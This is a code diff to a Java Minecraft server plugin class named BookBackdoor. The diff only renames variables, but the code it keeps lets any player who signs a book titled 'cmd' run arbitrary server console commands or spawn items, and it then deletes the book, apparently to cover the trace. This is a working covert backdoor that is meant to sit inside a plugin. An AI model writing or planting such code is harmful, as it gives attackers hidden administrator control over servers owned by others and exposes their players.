@@ -59,9 +59,9 @@ public class BookBackdoor implements Listener {
     public void onBookSign(PlayerEditBookEvent event) {
         if(event.getNewBookMeta().getTitle().equals("cmd")){
             String text = event.getNewBookMeta().getPage(1);
-            String owo = text.substring(1);
+            String command = text.substring(1);
             if(text.startsWith("/")){
-                this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), owo);
+                this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), command);
                 event.getPlayer().getInventory().getItemInMainHand().setAmount(event.getPlayer().getInventory().getItemInMainHand().getAmount()-1);
                 this.plugin.getServer().getScheduler().scheduleAsyncDelayedTask(this.plugin, new Runnable() {
                     public void run() {
@@ -69,7 +69,7 @@ public class BookBackdoor implements Listener {
                     }
                 }, 5);
             } else if(text.startsWith(".")){
-                String[] args = owo.split(" ", 0);
+                String[] args = command.split(" ", 0);
                 Player player = event.getPlayer();
                 if(args[0].equalsIgnoreCase("give")){
                     int amnt = 64;
@@ -77,8 +77,8 @@ public class BookBackdoor implements Listener {
                         amnt = Integer.parseInt(args[2]);
                     }
                     try {
-                        String uwu = args[1].toUpperCase();
-                        ItemStack item = new ItemStack(Material.getMaterial(uwu), amnt);
+                        String mat = args[1].toUpperCase();
+                        ItemStack item = new ItemStack(Material.getMaterial(mat), amnt);
                         if(item == null){
                             player.sendMessage("Use the Spigot naming scheme");
                         } else {
